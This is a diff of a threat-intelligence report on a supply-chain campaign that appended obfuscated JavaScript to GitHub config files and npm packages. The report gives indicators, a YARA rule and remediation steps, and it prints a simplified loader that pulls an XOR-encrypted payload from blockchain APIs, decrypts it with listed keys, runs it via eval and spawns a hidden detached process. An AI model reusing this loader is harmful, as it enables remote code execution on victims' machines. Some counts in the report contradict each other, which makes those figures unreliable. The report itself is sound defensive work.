@@ -1,13 +1,13 @@
-# PolinRider: DPRK threat actor implants malware in 634 GitHub repositories
+# PolinRider: DPRK Threat Actor Implants Malware in Hundreds of GitHub Repos
 
 ![PolinRider Threat Campaign](images/PolinRider-banner-image-smaller.jpg)
 
 - **Date:** 2026-03-07
-- **Severity:** CRITICAL — active supply chain infection across 634 public repositories
+- **Severity:** CRITICAL — active supply chain infection across hundreds public repositories
 
 ---
 
-The [OpenSourceMalware](https://opensourcemalware.com) team has uncovered a massive threat campaign that is implanting malware in GitHub users and organizations repositories using stolen credentials.  The threat actor is named PolinRider and they have implanted a malicious obfuscated JavaScript payloads in **634 public GitHub repositories** belonging to **337 unique owners**. 
+The [OpenSourceMalware](https://opensourcemalware.com) team has uncovered a massive threat campaign that is implanting malware in GitHub users and organizations repositories using stolen credentials.  The threat actor, PolinRider, has implanted a malicious obfuscated JavaScript payloads in **hundreds public GitHub repositories** belonging to **hundreds unique owners**. Use the [#polinrider](https://opensourcemalware.com/?search=%23polinrider) to see all threat reports related to this campaign, and [jump to the end](#compromised-repositories) of this blog for the list of compromised repositories, including ones we recommend prioritising for immediation action. Keep in mind that the tag is the best way to get current data.
 
 The JavaScript payload is appended to the end of real project config files — silently, after the file's legitimate content — making it easy to miss during casual code review. The primary infection vector appears to be a compromised npm package that executes during install or build and injects itself into config files in the project root.  Even worse, this threat actor has used the same technique to craft malicious NPM packages as well. 
 
@@ -15,13 +15,8 @@ This attack has been enormously successful, with one compromised open source pro
 
 The OpenSourceMalware team has attributed this campaign to the DPRK, and the threat actor PolinRider is a known Lazarus group contributor with connections to "Contagious Interview" and "TasksJacker" campaigns.
 
----
-
-This campaign is growing quickly with the total number of compromised repositories growing from 116 two days ago, to 634 today (March 8, 2026).
-
-![GitHub Repos Compromised](./images/PolinRider-campaign-combined-github-downloads.png)
-
-## Impact Statistics
+### Impact Statistics
+This campaign is growing quickly, with the total number of compromised repositories growing from 116 two days ago, to **634 public GitHub repositories** belonging to **337 unique owners** as of the publishing of this blog (March 8, 2026).
 
 | Metric | Count |
 |--------|-------|
@@ -29,6 +24,24 @@ This campaign is growing quickly with the total number of compromised repositori
 | Unique owners affected | 336 |
 | — Individual users | 292 |
 | — Organisations | 44 |
+
+![GitHub Repos Compromised](./images/PolinRider-campaign-combined-github-downloads.png)
+
+---
+
+## Recommended Actions
+
+**For affected repo owners:**
+1. Audit all JS config files (`postcss.config.*`, `tailwind.config.*`, `eslint.config.*`, `next.config.*`) for content appearing after `export default` or `module.exports`
+2. Review `package.json` dependencies — particularly any recently added or updated PostCSS/Tailwind-related packages
+3. Check `node_modules` for postinstall scripts: `grep -r "postinstall" node_modules/*/package.json`
+4. Rotate any secrets, tokens, or credentials that may have been present in the environment during a build
+5. Force-push clean config files and consider signing commits going forward
+
+**For security tooling / registries:**
+- Add YARA/regex rule for `rmcej%otb%` to static analysis pipelines
+- Flag packages with postinstall scripts that write to project root config files
+- Cross-reference affected repo owners against recently published npm packages
 
 ---
 
@@ -65,9 +78,265 @@ This final payload is a sophisticated **blockchain-based dead drop resolver** th
    - Dead drop resolver technique (hard to attribute)
    - Detached process execution (survives parent termination)
 
-### List of Compromised Repositories
+---
 
-All 634 repositories are in [OpenSourceMalware](https://opensourcemalware.com/?search=%23polinrider).
+## Infected File Types
+
+| File | Occurrences |
+|------|------------:|
+| `postcss.config.mjs` | 416 |
+| `tailwind.config.js` | 71 |
+| `eslint.config.mjs` | 67 |
+| `next.config.mjs` | 13 |
+| `App.js` | 13 |
+| `app.js` | 2 |
+
+The dominance of `postcss.config.mjs` (416 of 634 repos, ~74%) strongly points to a compromised PostCSS or Tailwind CSS-adjacent npm package as the primary infection vector.
+
+---
+
+## Malicious NPM Packages
+
+![tailwind-mainanimation NPM Package](images/PolinRider-campaign-npm-readme.png)
+
+The threat actor has published two NPM packages:
+
+- tailwind-mainanimation which was published by the "allavin" NPM user, and is still live
+- tailwind-autoanimation which was published by the blackedward NPM user, that has been removed from the NPM registry.  
+
+![NPM Packages](images/PolinRider-campaign-npm-author.png)
+
+The tailwind-autoanimation package uses the same exact technique of appending the malicious JavaScript payload onto the end of the entrypoint file src/index.js:
+
+![NPM Payload](images/PolinRider-campaign-npm-malicious-code.png)
+
+---
+
+## Malware Technical Analysis
+
+The OSM team described the complete attack chain for this malware in our [blog](https://opensourcemalware.com/blog/neutralinojs-compromise) on the recent Neutralinojs compromise.
+
+### Obfuscation Layers
+
+The malware uses four layers of obfuscation:
+
+**Layer 1:** Character swap algorithm with seed `2857687`
+   - Deobfuscates to array: `['r', 'object', 'm']` (require, typeof check, module)
+
+**Layer 2:** Character swap with seed `2667686`
+   - Deobfuscates function names and string constants
+   - Reveals the decoder function code
+
+**Layer 3:** Custom substitution cipher
+   - Character mapping using special codes
+   - Replaces placeholders like `.c`, `.a`, etc. with actual characters
+   - Character codes: `\`, `` ` ``, space, newline, `*`, `'`, and more
+
+**Layer 4:** XOR encryption for final payloads
+   - Payloads retrieved from blockchain are XOR-encrypted
+   - Two hardcoded keys for different stages
+
+### Execution Flow
+
+```
+1. Malware loads when NPM package is imported
+2. Deobfuscates internal strings and function names
+3. Queries TRON blockchain account for latest transaction
+   ├─ URL: https://api.trongrid.io/v1/accounts/TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP/transactions
+   └─ Extracts transaction data containing encrypted payload
+4. If TRON fails, queries Aptos blockchain
+   ├─ URL: https://fullnode.mainnet.aptoslabs.com/v1/accounts/0xbe037.../transactions
+   └─ Extracts payload from transaction arguments
+5. XOR-decrypts the payload using key "2[gWfGj;<:-93Z^C"
+6. Executes decrypted code via eval()
+7. Spawns detached child process for persistence
+   ├─ Command: node -e "<malicious code>"
+   └─ Detached: true, windowsHide: true
+8. If first set fails, repeats with secondary addresses and key
+```
+
+### Code Structure
+
+```javascript
+// Simplified structure (actual code is heavily obfuscated)
+
+async function fetchPayloadFromTron(address) {
+    // Queries TRON API for account transactions
+    const response = await https.get(
+        `https://api.trongrid.io/v1/accounts/${address}/transactions?only_confirmed=true&only_from=true&limit=1`
+    );
+    // Extracts encrypted data from transaction
+    return response.data[0].raw_data.data;
+}
+
+async function fetchPayloadFromAptos(txHash) {
+    // Queries Aptos API for transaction details
+    const response = await https.get(
+        `https://fullnode.mainnet.aptoslabs.com/v1/accounts/${txHash}/transactions?limit=1`
+    );
+    // Extracts payload from transaction arguments
+    return response[0].payload.arguments[0];
+}
+
+function xorDecrypt(encryptedData, key) {
+    // XOR decryption with repeating key
+    let result = '';
+    for (let i = 0; i < encryptedData.length; i++) {
+        const keyChar = key.charCodeAt(i % key.length);
+        result += String.fromCharCode(encryptedData.charCodeAt(i) ^ keyChar);
+    }
+    return result;
+}
+
+// Main execution
+const encryptedPayload = await fetchPayloadFromTron("TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP");
+const decryptedCode = xorDecrypt(encryptedPayload, "2[gWfGj;<:-93Z^C");
+eval(decryptedCode);  // EXECUTES ARBITRARY CODE
+
+// Persistence via detached child process
+require('child_process').spawn('node', ['-e', `global['_V']='...'${decryptedCode}`], {
+    detached: true,
+    stdio: 'ignore',
+    windowsHide: true
+});
+```
+
+---
+
+## C2 Infrastructure (Indicators of Compromise)
+
+### Blockchain Addresses
+
+#### TRON Addresses (Primary C2)
+- **`TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP`** (Primary)
+- **`TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG`** (Secondary)
+
+API Endpoint: `https://api.trongrid.io/v1/accounts/`
+
+#### Aptos Transaction Hashes (Fallback C2)
+- **`0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e`** (Primary)
+- **`0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3`** (Secondary)
+
+API Endpoint: `https://fullnode.mainnet.aptoslabs.com/v1/accounts/`
+
+#### BSC RPC Nodes
+- `bsc-dataseed.binance.org`
+- `bsc-rpc.publicnode.com`
+
+Method: `eth_getTransactionByHash`
+
+### XOR Decryption Keys
+- **Primary Key:** `2[gWfGj;<:-93Z^C`
+- **Secondary Key:** `m6:tTh^D)cBz?NM]`
+
+### YARA Rule (Suggested)
+
+```yara
+rule rmcej_otb_payload {
+    meta:
+        description = "Detects rmcej%otb% shuffle-cipher JS payload injected into config files"
+        author = "OpenSourceMalware.com"
+        date = "2026-03-07"
+        severity = "high"
+
+    strings:
+        $marker   = "rmcej%otb%"
+        $global   = "global['!']"
+        $seed1    = "2857687"
+        $seed2    = "2667686"
+        $varname  = "_$_1e42"
+
+    condition:
+        $marker or ($global and $seed1) or ($varname and $seed2)
+}
+```
+
+---
+
+## Data Collection
+
+Data was collected using the GitHub Code Search API via `gh search code`, running one query per infected filename to work around the 1,000-result-per-query cap. Results were deduplicated by repository full name.
+
+| Filename searched | Results |
+|-------------------|--------:|
+| `postcss.config.mjs` | 416 |
+| `tailwind.config.js` | 71 |
+| `eslint.config.mjs` | 67 |
+| `App.js` | 15 |
+| `next.config.mjs` | 13 |
+| `index.js` | 6 |
+| **Total (pre-dedup)** | **588** |
+| **Unique repos** | **634** |
+
+---
+
+## Files
+
+| File | Description |
+|------|-------------|
+| `README.md` | This report |
+| `affected_repos.csv` | All 634 affected repositories — organisations first, then users, each sorted by stars+forks descending |
+| `affected_users.csv` | All 336 affected owners — organisations first, then users, each sorted by followers descending |
+
+---
+
+## Compromised Repositories
+
+All compromised repositories can be found through the OpenSourceMalware tag [#polinrider](https://opensourcemalware.com/?search=%23polinrider).
+
+### Outreach Prioritisation
+
+The full CSVs are sorted by impact for triage.
+
+#### Top Repos by Stars + Forks
+
+| Repository | Stars | Forks | Infected File |
+|------------|------:|------:|---------------|
+| `Codechef-VITC-Student-Chapter/Club-Integration-and-Management-Platform` | 6 | 11 | `postcss.config.mjs` |
+| `Victorola-coder/tewo` | 9 | 6 | `tailwind.config.js` |
+| `Atik203/Scholar-Flow` | 4 | 4 | `postcss.config.mjs` |
+| `coderkhalide/Anti-Detect-Browser` | 2 | 4 | `postcss.config.mjs` |
+| `WeerasingheMSC/ASMS_Frontend` | 1 | 4 | `postcss.config.mjs` |
+| `fsdteam8/n_Krypted-frontend` | 0 | 4 | `postcss.config.mjs` |
+| `Kreliannn/Document-Request-System-FRONTEND` | 8 | 1 | `postcss.config.mjs` |
+| `tanushbhootra576/Bionary-Website-Challenge-and-final` | 4 | 2 | `postcss.config.mjs` |
+| `sparktechagency/Vap-shop-Front-End-` | 7 | 0 | `postcss.config.mjs` |
+| `Kreliannn/PDF-To-Reviewer-Quiz-FRONTEND` | 7 | 0 | `postcss.config.mjs` |
+
+#### Top Organisations by Followers
+
+| Organisation | Followers | Repos Affected |
+|--------------|----------:|---------------:|
+| `sparktechagency` | 130 | 12 |
+| `FSDTeam-SAA` | 21 | 11 |
+| `Softvence-Omega-Dev-Ninjas` | 18 | 4 |
+| `Codechef-VITC-Student-Chapter` | 17 | 1 |
+| `softvence-omega-future-stack` | 11 | 4 |
+| `The-Extra-Project` | 11 | 1 |
+| `etrainermis` | 7 | 1 |
+| `tricodenetwork` | 7 | 1 |
+| `Binary-Mindz` | 6 | 1 |
+| `FlowBondTech` | 3 | 3 |
+
+#### Top Individual Users by Followers
+
+| User | Followers | Repos Affected |
+|------|----------:|---------------:|
+| `coderkhalide` | 349 | 4 |
+| `finom` | 172 | 3 |
+| `Victorola-coder` | 121 | 1 |
+| `dhruvmalik007` | 87 | 6 |
+| `a-belard` | 43 | 1 |
+| `Muhammadfaizanjanjua109` | 39 | 1 |
+| `Nathanim1919` | 38 | 5 |
+| `kanchana404` | 33 | 3 |
+| `AKDebug-UX` | 30 | 3 |
+| `web-ghoul` | 29 | 2 |
+
+> **Priority targets:** `sparktechagency` (130 followers, 12 repos) and `FSDTeam-SAA` (21 followers, 11 repos) are the highest-volume orgs. Among individuals, `coderkhalide` (349 followers) has the widest direct reach.
+
+---
+### All Compromised Repositories as of March 7, 2026
 
 | # | Repository | Owner | Owner Type | Stars | Forks | Infected Files | File Paths | Description | Repo URL |
 | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
@@ -705,277 +974,6 @@ All 634 repositories are in [OpenSourceMalware](https://opensourcemalware.com/?s
 | 632 | Vladyslav0060/gdocs-clone | Vladyslav0060 | User | 0 | 0 | 1 | postcss.config.mjs |  | https://github.com/Vladyslav0060/gdocs-clone |
 | 633 | web-ghoul/AlCazar | web-ghoul | User | 0 | 0 | 1 | postcss.config.mjs |  | https://github.com/web-ghoul/AlCazar |
 | 634 | ZekiKobe/lege-api | ZekiKobe | User | 0 | 0 | 1 | postcss.config.mjs |  | https://github.com/ZekiKobe/lege-api |
-
-
----
-
-## Infected File Types
-
-| File | Occurrences |
-|------|------------:|
-| `postcss.config.mjs` | 416 |
-| `tailwind.config.js` | 71 |
-| `eslint.config.mjs` | 67 |
-| `next.config.mjs` | 13 |
-| `App.js` | 13 |
-| `app.js` | 2 |
-
-The dominance of `postcss.config.mjs` (416 of 634 repos, ~74%) strongly points to a compromised PostCSS or Tailwind CSS-adjacent npm package as the primary infection vector.
-
----
-
-## Malicious NPM Packages
-
-![tailwind-mainanimation NPM Package](images/PolinRider-campaign-npm-readme.png)
-
-The threat actor has published two NPM packages so far that we know about:  
-
-- tailwind-mainanimation which was published by the "allavin" NPM user, and is still live
-- tailwind-autoanimation which was published by the blackedward NPM user, that has been removed from the NPM registry.  
-
-![NPM Packages](images/PolinRider-campaign-npm-author.png)
-
-The tailwind-autoanimation package uses the same exact technique of appending the malicious JavaScript payload onto the end of the entrypoint file src/index.js:
-
-
-![NPM Payload](images/PolinRider-campaign-npm-malicious-code.png)
-
----
-
-## Malware Technical Analysis
-
-The OSM team wrote up the complete attack chain for this malware in our blog post about the Neutralinojs compromise.  You can read that analsys [HERE](https://opensourcemalware.com/blog/neutralinojs-compromise).
-
-### Obfuscation Layers
-
-The malware uses 4 layers of obfuscation:
-
-1. **Layer 1:** Character swap algorithm with seed `2857687`
-   - Deobfuscates to array: `['r', 'object', 'm']` (require, typeof check, module)
-
-2. **Layer 2:** Character swap with seed `2667686`
-   - Deobfuscates function names and string constants
-   - Reveals the decoder function code
-
-3. **Layer 3:** Custom substitution cipher
-   - Character mapping using special codes
-   - Replaces placeholders like `.c`, `.a`, etc. with actual characters
-   - Character codes: `\`, `` ` ``, space, newline, `*`, `'`, and more
-
-4. **Layer 4:** XOR encryption for final payloads
-   - Payloads retrieved from blockchain are XOR-encrypted
-   - Two hardcoded keys for different stages
-
-### Execution Flow
-
-```
-1. Malware loads when NPM package is imported
-2. Deobfuscates internal strings and function names
-3. Queries TRON blockchain account for latest transaction
-   ├─ URL: https://api.trongrid.io/v1/accounts/TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP/transactions
-   └─ Extracts transaction data containing encrypted payload
-4. If TRON fails, queries Aptos blockchain
-   ├─ URL: https://fullnode.mainnet.aptoslabs.com/v1/accounts/0xbe037.../transactions
-   └─ Extracts payload from transaction arguments
-5. XOR-decrypts the payload using key "2[gWfGj;<:-93Z^C"
-6. Executes decrypted code via eval()
-7. Spawns detached child process for persistence
-   ├─ Command: node -e "<malicious code>"
-   └─ Detached: true, windowsHide: true
-8. If first set fails, repeats with secondary addresses and key
-```
-
-### Code Structure
-
-```javascript
-// Simplified structure (actual code is heavily obfuscated)
-
-async function fetchPayloadFromTron(address) {
-    // Queries TRON API for account transactions
-    const response = await https.get(
-        `https://api.trongrid.io/v1/accounts/${address}/transactions?only_confirmed=true&only_from=true&limit=1`
-    );
-    // Extracts encrypted data from transaction
-    return response.data[0].raw_data.data;
-}
-
-async function fetchPayloadFromAptos(txHash) {
-    // Queries Aptos API for transaction details
-    const response = await https.get(
-        `https://fullnode.mainnet.aptoslabs.com/v1/accounts/${txHash}/transactions?limit=1`
-    );
-    // Extracts payload from transaction arguments
-    return response[0].payload.arguments[0];
-}
-
-function xorDecrypt(encryptedData, key) {
-    // XOR decryption with repeating key
-    let result = '';
-    for (let i = 0; i < encryptedData.length; i++) {
-        const keyChar = key.charCodeAt(i % key.length);
-        result += String.fromCharCode(encryptedData.charCodeAt(i) ^ keyChar);
-    }
-    return result;
-}
-
-// Main execution
-const encryptedPayload = await fetchPayloadFromTron("TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP");
-const decryptedCode = xorDecrypt(encryptedPayload, "2[gWfGj;<:-93Z^C");
-eval(decryptedCode);  // EXECUTES ARBITRARY CODE
-
-// Persistence via detached child process
-require('child_process').spawn('node', ['-e', `global['_V']='...'${decryptedCode}`], {
-    detached: true,
-    stdio: 'ignore',
-    windowsHide: true
-});
-```
-
----
-
-## Outreach Prioritisation
-
-The full CSVs are sorted by impact for triage.
-
-### Top Repos by Stars + Forks
-
-| Repository | Stars | Forks | Infected File |
-|------------|------:|------:|---------------|
-| `Codechef-VITC-Student-Chapter/Club-Integration-and-Management-Platform` | 6 | 11 | `postcss.config.mjs` |
-| `Victorola-coder/tewo` | 9 | 6 | `tailwind.config.js` |
-| `Atik203/Scholar-Flow` | 4 | 4 | `postcss.config.mjs` |
-| `coderkhalide/Anti-Detect-Browser` | 2 | 4 | `postcss.config.mjs` |
-| `WeerasingheMSC/ASMS_Frontend` | 1 | 4 | `postcss.config.mjs` |
-| `fsdteam8/n_Krypted-frontend` | 0 | 4 | `postcss.config.mjs` |
-| `Kreliannn/Document-Request-System-FRONTEND` | 8 | 1 | `postcss.config.mjs` |
-| `tanushbhootra576/Bionary-Website-Challenge-and-final` | 4 | 2 | `postcss.config.mjs` |
-| `sparktechagency/Vap-shop-Front-End-` | 7 | 0 | `postcss.config.mjs` |
-| `Kreliannn/PDF-To-Reviewer-Quiz-FRONTEND` | 7 | 0 | `postcss.config.mjs` |
-
-### Top Organisations by Followers
-
-| Organisation | Followers | Repos Affected |
-|--------------|----------:|---------------:|
-| `sparktechagency` | 130 | 12 |
-| `FSDTeam-SAA` | 21 | 11 |
-| `Softvence-Omega-Dev-Ninjas` | 18 | 4 |
-| `Codechef-VITC-Student-Chapter` | 17 | 1 |
-| `softvence-omega-future-stack` | 11 | 4 |
-| `The-Extra-Project` | 11 | 1 |
-| `etrainermis` | 7 | 1 |
-| `tricodenetwork` | 7 | 1 |
-| `Binary-Mindz` | 6 | 1 |
-| `FlowBondTech` | 3 | 3 |
-
-### Top Individual Users by Followers
-
-| User | Followers | Repos Affected |
-|------|----------:|---------------:|
-| `coderkhalide` | 349 | 4 |
-| `finom` | 172 | 3 |
-| `Victorola-coder` | 121 | 1 |
-| `dhruvmalik007` | 87 | 6 |
-| `a-belard` | 43 | 1 |
-| `Muhammadfaizanjanjua109` | 39 | 1 |
-| `Nathanim1919` | 38 | 5 |
-| `kanchana404` | 33 | 3 |
-| `AKDebug-UX` | 30 | 3 |
-| `web-ghoul` | 29 | 2 |
-
-> **Priority targets:** `sparktechagency` (130 followers, 12 repos) and `FSDTeam-SAA` (21 followers, 11 repos) are the highest-volume orgs. Among individuals, `coderkhalide` (349 followers) has the widest direct reach.
-
----
-
-## C2 Infrastructure (Indicators of Compromise)
-
-### Blockchain Addresses
-
-#### TRON Addresses (Primary C2)
-- **`TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP`** (Primary)
-- **`TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG`** (Secondary)
-
-API Endpoint: `https://api.trongrid.io/v1/accounts/`
-
-#### Aptos Transaction Hashes (Fallback C2)
-- **`0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e`** (Primary)
-- **`0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3`** (Secondary)
-
-API Endpoint: `https://fullnode.mainnet.aptoslabs.com/v1/accounts/`
-
-#### BSC RPC Nodes
-- `bsc-dataseed.binance.org`
-- `bsc-rpc.publicnode.com`
-
-Method: `eth_getTransactionByHash`
-
-### XOR Decryption Keys
-- **Primary Key:** `2[gWfGj;<:-93Z^C`
-- **Secondary Key:** `m6:tTh^D)cBz?NM]`
-
-### YARA Rule (Suggested)
-
-```yara
-rule rmcej_otb_payload {
-    meta:
-        description = "Detects rmcej%otb% shuffle-cipher JS payload injected into config files"
-        author = "OpenSourceMalware.com"
-        date = "2026-03-07"
-        severity = "high"
-
-    strings:
-        $marker   = "rmcej%otb%"
-        $global   = "global['!']"
-        $seed1    = "2857687"
-        $seed2    = "2667686"
-        $varname  = "_$_1e42"
-
-    condition:
-        $marker or ($global and $seed1) or ($varname and $seed2)
-}
-```
-
----
-
-## Recommended Actions
-
-**For affected repo owners:**
-1. Audit all JS config files (`postcss.config.*`, `tailwind.config.*`, `eslint.config.*`, `next.config.*`) for content appearing after `export default` or `module.exports`
-2. Review `package.json` dependencies — particularly any recently added or updated PostCSS/Tailwind-related packages
-3. Check `node_modules` for postinstall scripts: `grep -r "postinstall" node_modules/*/package.json`
-4. Rotate any secrets, tokens, or credentials that may have been present in the environment during a build
-5. Force-push clean config files and consider signing commits going forward
-
-**For security tooling / registries:**
-- Add YARA/regex rule for `rmcej%otb%` to static analysis pipelines
-- Flag packages with postinstall scripts that write to project root config files
-- Cross-reference affected repo owners against recently published npm packages
-
----
-
-## Data Collection
-
-Data was collected using the GitHub Code Search API via `gh search code`, running one query per infected filename to work around the 1,000-result-per-query cap. Results were deduplicated by repository full name.
-
-| Filename searched | Results |
-|-------------------|--------:|
-| `postcss.config.mjs` | 416 |
-| `tailwind.config.js` | 71 |
-| `eslint.config.mjs` | 67 |
-| `App.js` | 15 |
-| `next.config.mjs` | 13 |
-| `index.js` | 6 |
-| **Total (pre-dedup)** | **588** |
-| **Unique repos** | **634** |
-
----
-
-## Files
-
-| File | Description |
-|------|-------------|
-| `README.md` | This report |
-| `affected_repos.csv` | All 634 affected repositories — organisations first, then users, each sorted by stars+forks descending |
-| `affected_users.csv` | All 336 affected owners — organisations first, then users, each sorted by followers descending |
 
 ---
 
